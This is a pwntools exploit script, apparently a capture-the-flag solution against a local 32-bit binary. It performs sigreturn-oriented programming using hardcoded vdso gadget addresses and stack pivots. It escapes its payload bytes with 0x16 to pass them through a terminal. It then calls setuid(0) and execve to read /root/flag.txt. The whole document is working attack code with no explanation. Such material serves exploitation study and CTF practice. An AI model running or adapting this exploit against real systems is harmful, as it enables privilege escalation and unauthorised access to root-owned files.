from pwn import *

if args.LOCAL:
        io = process('./run.sh')
exe = ELF('./target')

io.sendlineafter(b'$ ', b'./target')

int80 = 0x8049029
vdso_base   = 0xf7ffc000
sigreturn  = vdso_base+0x591
leave_ret = vdso_base+0xb7c

curr_esp = 0xffffde4c
for i in range(13):
    payload = (b'\x16\x15\x90\x16\x04\x08')*8
    payload += p32(leave_ret)
    payload += p32(curr_esp)
    sleep(0.5)
    io.send(payload+b'\x04')
    curr_esp -= 0x1c

esp = 0xffffcf50
frame = SigreturnFrame()
frame.eax = 0x17
frame.ebx = 0x0
frame.esp = esp
frame.eip = int80
payload = b'a'*0x20
payload += p32(sigreturn)
frame_escaped = b''
for ch in bytes(frame):
    frame_escaped += bytes([0x16, ch])
payload += frame_escaped
io.send(payload+b'\x04')

frame = SigreturnFrame()
frame.eax = 0xb
frame.ebx = esp+0x50
frame.ecx = esp-0x24
frame.esp = esp
frame.eip = int80
payload = p32(esp+0x50)+p32(esp+0x58+0x4)+p32(0)*2+b'a'*0x10

payload += p32(sigreturn)
frame_escaped = b''
for ch in bytes(frame):
    frame_escaped += bytes([0x16, ch])
payload += frame_escaped
payload += b'cat' + p32(0)
payload += b'/root/flag.txt\0'
io.send(payload+b'\x04')

io.interactive()
